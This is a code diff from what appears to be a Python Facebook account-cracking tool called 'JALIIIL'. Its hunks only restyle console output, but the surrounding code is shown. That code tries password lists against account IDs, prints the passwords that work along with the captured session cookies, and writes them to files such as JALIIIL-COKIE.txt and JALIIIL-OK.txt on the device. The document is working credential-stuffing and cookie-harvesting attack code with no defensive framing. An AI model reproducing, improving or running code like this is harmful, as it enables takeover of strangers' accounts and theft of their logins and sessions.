@@ -602,7 +602,7 @@ def api2(ids,names,passlist):
                         if 'session_key' in po:
                                         print('\r\r\033[1;32m [JALIIIL-OK] '+ids+' √ '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print("Cookie:\r\r\033[1;93m "+coki)
+                                        print("\r\r\033[1;93m Cookie: "+coki)
                                         open('/sdcard/JALIIIL/JALIIIL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                         open('/sdcard/JALIIIL/JALIIIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
@@ -614,7 +614,7 @@ def api2(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\033[1;91m JALIIIL-CP] '+ids+' ✗ '+pas+'\033[1;97m')
+                                                print('\r\r\033[1;91m [JALIIIL-CP] '+ids+' ✗ '+pas+'\033[1;97m')
                                                 open('/sdcard/JALIIIL/JALIIIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
@@ -705,7 +705,7 @@ def JALIIIL4(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [JALIIIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [JALIIIL-OK] '+str(uid)+' √ '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
                                         open('/sdcard/JALIIIL/JALIIIL-COOKIE.txt','a').write(coki+'\n')
@@ -719,7 +719,7 @@ def JALIIIL4(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\033[1;33m [JALIIIL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;33m [JALIIIL-CP] '+str(uid)+' ✗ '+pas+'\033[1;97m')
                                         open('/sdcard/JALIIIL/JALIIIL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
